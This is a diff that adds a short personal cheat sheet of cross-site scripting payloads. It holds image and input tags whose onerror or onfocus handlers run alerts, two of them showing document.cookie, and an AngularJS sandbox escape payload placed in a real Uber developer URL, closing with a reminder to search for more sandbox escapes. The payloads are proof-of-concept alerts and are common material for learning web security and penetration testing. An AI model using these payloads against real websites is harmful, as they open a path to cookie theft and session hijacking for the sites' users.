@@ -1,0 +1,17 @@
+XSS Payloads
+
+<img src='x' onerror='alert(1)'>
+<img src="x" onerror="alert('XXsed by 07B4')">
+
+<img src="" onerror="alert(document.cookie)" />
+
+<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>
+
+<span style="color: red"> Github </span>
+
+Using the following JavaScript within the Uber URL, Kettle escaped
+the AngularJS Sandbox and executed the alert function:
+https://developer.uber.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}
+[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")
+()}}zzzz
+MORAL: Search for sandbox escape payloads
